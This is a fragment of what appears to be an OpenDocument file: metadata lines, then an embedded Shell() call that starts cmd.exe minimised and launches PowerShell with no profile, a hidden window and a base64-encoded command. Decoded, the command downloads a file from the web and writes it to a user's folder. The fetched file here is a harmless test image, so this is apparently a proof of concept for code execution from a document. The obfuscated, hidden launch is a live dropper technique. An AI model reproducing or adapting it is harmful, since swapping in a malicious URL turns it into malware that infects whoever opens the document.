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09:21:30.262642844</meta:creation-date>
    <dc:date>2023-03-08T09:24:15.902668328</dc:date>
    <meta:editing-duration>PT2M45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Shell("cmd.exe /MIN /C ",0,"powershell.exe -nop -w hidden -encodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AdQBwAGwAbwBhAGQALgB3AGkAawBpAG0AZQBkAGkAYQAuAG8AcgBnAC8AdwBpAGsAaQBwAGUAZABpAGEALwBjAG8AbQBtAG8AbgBzAC8AYgAvAGIAZAAvAFQAZQBzAHQALgBzAHYAZwAiACAALQBPAHUAdABGAGkAbABlACAAIgBDADoAXABVAHMAZQByAHMAXABsAHUAYwBhAHMAXABhAHIAYwBoAGkAdgBlAC4AcwB2AGcAIgA=","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